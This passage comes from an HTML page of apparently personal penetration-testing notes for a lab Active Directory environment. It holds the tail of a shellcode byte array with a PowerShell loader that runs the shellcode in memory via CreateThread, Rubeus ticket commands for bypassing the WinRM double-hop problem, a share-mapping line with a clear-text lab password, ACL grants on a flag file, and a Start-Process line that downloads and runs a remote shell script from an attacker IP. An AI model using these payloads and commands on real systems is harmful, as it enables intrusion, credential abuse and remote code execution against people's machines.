style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf9</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x12</span>,<span style="color:#333333;font-weight:400">0x96</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x83</span>,<br /><span style="color:#333333;font-weight:400">0xc4</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0xb2</span>,<span style="color:#333333;font-weight:400">0x66</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x7</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc3</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xd2</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0xc3</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x59</span>,0x<br />bb,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x1d</span>,<span style="color:#333333;font-weight:400">0x2a</span>,<span style="color:#333333;font-weight:400">0xa</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xda</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span><br />[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::Copy</span>(<span style="color:#0088ff;font-weight:400">$buf</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$lpMem</span>, <span style="color:#0088ff;font-weight:400">$buf</span>.length)<br /><span style="color:#0088ff;font-weight:400">$hThread</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>GetDelegateForFunctionPointer((LookupFunc kernel32.dll<br />CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])<br />([IntPtr]))).Invoke([IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$lpMem</span>, [IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero, <span style="color:#333333;font-weight:400">0</span>, [IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero)<br />[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>GetDelegateForFunctionPointer((LookupFunc kernel32.dll<br />WaitForSingleObject), (getDelegateType @([IntPtr], [<span style="color:#7f0044;font-weight:400">Int32</span>]) ([<span style="color:#7f0044;font-weight:400">Int</span>]))).Invoke(<span style="color:#0088ff;font-weight:400">$hThread</span>, <span style="color:#333333;font-weight:400">0xFFFFFFFF</span>)<br /><br /></pre></div></p><p></p><p></p><p></p><p><h2>Transfer file on linux</h2><ul><li>base64 -w0 &lt;filename&gt;</li><li>echo &lt;base64 string here&gt; | base65 -d &gt; krb5cc_ivar</li></ul></p><p></p><p><h2>Make file executable to payload </h2></p><p><div class="codebox"><pre>xxd -i <span style="color:#ff9d00;font-weight:700">&lt;</span>executable<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p></p><p></p><p><h2>Bypass double-hop problem</h2><ul><li>kerbero is used for sso <ul><li>it needs tickets to work on</li></ul></li><li>when u connect to a host via winrm user&#39;s tickets are not stored onto memory <ul><li>e.g sharphound will not work </li></ul></li><li>get arround <ul><li>use rubeus to ask for tgt (e.g runas on windows )</li><li>rubeus.exe asktgt /user:$user /password:$password /domaon:$domain /nowrap<ul><li>rubeus.exe createnetonly /program:c:\\windows\\system32\\cmd.exe /domain:$domain /username:$username /password:$password /ticket:$ticket</li><li>// it create a process token that we can migrate to </li><li></li><li>migrate $pid </li></ul></li></ul></li></ul></p><p></p><p></p><p></p><p><h2>Map a share on windows</h2></p><p><div class="codebox"><pre>net use M<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#0088ff;font-weight:400">$target</span><span style="color:#ff9d00;font-weight:700">\</span>share <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#0088ff;font-weight:400">$user</span> <span style="color:#0088ff;font-weight:400">$password</span> <br /><span style="color:#0088ff;font-weight:400">## e.g </span><br />net use M<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">\\</span>fs01.rastalabs.local<span style="color:#ff9d00;font-weight:700">\</span>home$<span style="color:#ff9d00;font-weight:700">\</span>ngodfrey <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>ngodfrey <span style="color:#3ad900;font-weight:400">&quot;zaq123$%^&amp;*()_+&quot;</span></pre></div></p><p></p><p></p><p><h2>Grant privileges ACL windows</h2></p><p></p><p><div class="codebox"><pre>icacls c<span style="color:#ff9d00;font-weight:700">:\</span>users<span style="color:#ff9d00;font-weight:700">\</span>administrator<span style="color:#ff9d00;font-weight:700">\</span>desktop<span style="color:#ff9d00;font-weight:700">\</span>flag.txt <span style="color:#ff9d00;font-weight:700">/</span>grant RLAB<span style="color:#ff9d00;font-weight:700">\</span>ahope<span style="color:#ff9d00;font-weight:700">:</span>F<br />icacls <span style="color:#0088ff;font-weight:400">$file</span> <span style="color:#ff9d00;font-weight:700">/</span>grant <span style="color:#0088ff;font-weight:400">$user</span><span style="color:#ff9d00;font-weight:700">:</span>F</pre></div></p><p></p><p></p><p><h2>EVil-winrm download</h2></p><p><ul><li>download c:\\\\windows\\tasks\\20240214080304_BloodHound.zip /tmp/bloodhound_web05.zip</li></ul></p><p></p><p></p><p></p><p><h2>WIndows credentials</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># use powershell credentials</span><br /><span style="color:#0088ff;font-weight:400"># Storing the credentials as variables</span><br /><span style="color:#0088ff;font-weight:400">$pass</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">ConvertTo-SecureString</span> <span style="color:#333333;font-weight:400">&#39;&lt;PASSWORD&gt;&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>asplaintext <span style="color:#ff9d00;font-weight:700">-</span>force<br /><span style="color:#0088ff;font-weight:400">$cred</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.Management.Automation.PSCredential(<span style="color:#333333;font-weight:400">&#39;&lt;USERNAME&gt;&#39;</span>, <span style="color:#0088ff;font-weight:400">$pass</span>)<br /><span style="color:#0088ff;font-weight:400"># Launch a process</span><br /><span style="color:#ff9d00;font-weight:700">Start-Process</span> <span style="color:#ff9d00;font-weight:700">-</span>FilePath <span style="color:#3ad900;font-weight:400">&quot;powershell&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>argumentlist <span style="color:#3ad900;font-weight:400">&quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.7:5555/shell-admin.ps1&#39;)&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>Credential <span style="color:#0088ff;font-weight:400">$cred</span><br /><br /><span style="color:#0088ff;font-weight:400"># winrm </span><br /><span style="color:#ff9d00;font-weight:700">Enter-PSSession</span> <span style="color:#ff9d00;font-weight:700">-</span>Computername &lt;IP&gt; <span style="color:#ff9d00;font-weight:700">-</span>Credential &lt;CREDENTIAL&gt;</pre></div></p><p></p><p></p><p><h2>Winrm</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># check who can use the WinRM Protocol</span><br />(<span style="color:#ff9d00;font-weight:700">Get-PSSessionConfiguration</span> <span style="color:#333333;font-weight:400">-Name</span> Microsoft.PowerShell).Permission<br /><span style="color:#0088ff;font-weight:400"># If the service is disable, you can enable with the following command</span><br /><span style="color:#ff9d00;font-weight:700">Enable-PSRemoting</span> <span style="color:#ff9d00;font-weight:700">-</span>Force  </pre></div></p></div>
</body>
</html>
